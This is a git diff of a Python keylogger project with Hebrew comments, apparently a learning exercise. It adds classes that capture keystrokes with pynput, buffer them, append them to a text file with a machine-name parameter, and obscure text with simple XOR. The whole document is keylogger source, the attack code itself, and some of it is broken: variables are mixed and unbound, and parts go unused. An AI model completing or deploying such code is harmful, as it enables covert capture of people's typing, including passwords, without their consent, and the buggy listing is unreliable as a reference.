@@ -3,49 +3,72 @@ from abc import ABC, abstractmethod
 import threading
 
 text = []
-
+#מחלקה שמפעילה את התוכנית או מכבה
 class IKeyLogger(ABC):
+    def __init__(self):
+        self.text = []
+        self.listener = None
     @abstractmethod
     def start_logging(self):
+        
         def on_press(key):
             global text
             if key == keyboard.Key.enter:
-                text.append(key)
+                self.text.append(key)
             elif key == keyboard.Key.tab:
-                text.append(key)
+                self.text.append(key)
             elif key == keyboard.Key.space:
-                text.append(' ') 
+                self.text.append(' ') 
             elif key == keyboard.Key.shift:
                 pass
             elif key == keyboard.Key.backspace and len(text) == 0:
                 pass
             elif key == keyboard.Key.backspace and len(text) > 0:
-                text = text[:-1]
+                self.text = self.text[:-1]
             elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                 pass
             elif key == keyboard.Key.esc:
                 return False
             else:
-                text.append(key)
+                self.text.append(key)
                 print(text)
+            
         with keyboard.Listener(
-            on_press=on_press) as listener: 
-            listener.join()   
-               
+            on_press=on_press) as listener:
+            listener.join()    
+                          
     @abstractmethod
     def stop_logging(self):
-        # with keyboard.Listener(
-        #     on_press=on_press) as listenner:
-        #     listenner.stop()
-        
-        pass
+        if self.listener:
+            self.listener.stop()
 
     @abstractmethod
     def get_logged_keys(self):
-        pass
+        return self.text
+        
 
 
-a = IKeyLogger
-a.start_logging(self=None)
 
+#מחלקה שכותבת את המילים המתקבלות לתוך קובץ טקסט
+class IWriter(ABC):
+    @abstractmethod
+    def send_data(self, data: str, machine_name: str):
+        for i in data:
+            text += i
+        with open('text.txt','a') as file:
+            file.write(text)
+        
 
+#xor מחלקה שמצפינה מילים באצעות
+class Encryptor:
+    def encryption_using_xor(self,data: list,key):
+        encrypted_text = ''
+        key_length = len(data)
+        for i, word in enumerate(data):
+            encrypted_text += chr(ord(word) ^ key)
+        print (encrypted_text)    
+        return encrypted_text
+    #דוגמא לשימוש בהצפנה
+# a = Encryptor()
+# b = a.encryption_using_xor('yosef taktuk ashkelon',4) 
+# a.encryption_using_xor(b,4)
